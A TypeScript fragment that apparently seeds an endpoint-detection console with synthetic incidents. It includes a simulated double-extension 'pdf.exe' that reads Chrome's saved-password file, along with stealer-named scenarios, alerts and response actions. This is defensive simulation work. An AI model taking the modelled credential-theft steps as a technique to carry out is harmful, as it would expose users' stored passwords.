    s.alert(p, 400, n.rule, n.summary, { data: n.data, evidence: [s.events.find((e) => e.guid === p.guid)!] })
    if (chance(0.25)) s.alert(p, 70_000, n.rule, n.summary, { data: n.data })
    const recent = daysAgo < 0.8
    const r = pick(reviewers)
    const status = recent ? 'open' : n.status
    out.push(
      s.finalize({
        status,
        classification: status === 'open' ? null : n.classification,
        assignee: status === 'open' ? null : r,
        contained: true,
        storyline: n.story,
        statusChanges: status === 'open' ? [] : [{ dt: int(20, 600) * MIN, title: `Status → ${status === 'resolved' ? 'Resolved' : 'Dismissed'}`, actor: r.name }],
      }),
    )
  }
  return out
}

export function buildIncidents(ctx: Ctx, all: Device[]): IncidentDetail[] {
  return [lumma(ctx), abe(ctx), debugKey(ctx), canary(ctx), vidar(ctx), backupFp(ctx), acreed(ctx), filefix(ctx), tamper(ctx), ...noise(ctx, all)]
}

/** A fresh incident injected while the console is open, to exercise live updates. */
export function liveIncident(ctx: Ctx, all: Device[]): IncidentDetail {
  const d = pick(all.filter((x) => x.hostname.startsWith('HR') || x.hostname.startsWith('SAL')))
  const s = new Story(d, Date.now() - 4_000, ctx.rules, ctx.modes(d))
  const ex = s.proc(null, EXPLORER, 'C:\\Windows\\Explorer.EXE', { dt: -HOUR, pid: 4100, signer: MS, quiet: true })
  const img = `${home(d)}\\Downloads\\ShippingRates_Q4.pdf.exe`
  const p = s.proc(ex, img, `"${img}"`, { dt: 0, motw: 3, size: 4_200_000 })
  s.alert(p, 300, 'ST-12', 'A program disguised as a PDF (double extension) ran from Downloads.', {
    evidence: [s.events.find((e) => e.guid === p.guid)!],
  })
  const r = s.file(p, 2_100, `${chromeData(d)}\\Login Data`)
  s.alert(p, 2_300, 'ST-01', 'ShippingRates_Q4.pdf.exe read saved Chrome passwords.', { data: ['browser_passwords'], evidence: [r] })
  return s.finalize({
    status: 'open',
    contained: false,
    storyline: `\`ShippingRates_Q4.pdf.exe\`, a program **disguised as a PDF**, ran from **Downloads** and read **saved Chrome passwords**. No upload has been seen yet. Kill it now.`,
    approve: [
      { text: 'Kill ShippingRates_Q4.pdf.exe', action: { type: 'kill_process', pid: p.pid, guid: p.guid, tree: true } },
      { text: 'Isolate the host', action: { type: 'isolate_host', allow_ips: [] } },
    ],
  })
}

export { sha256 }
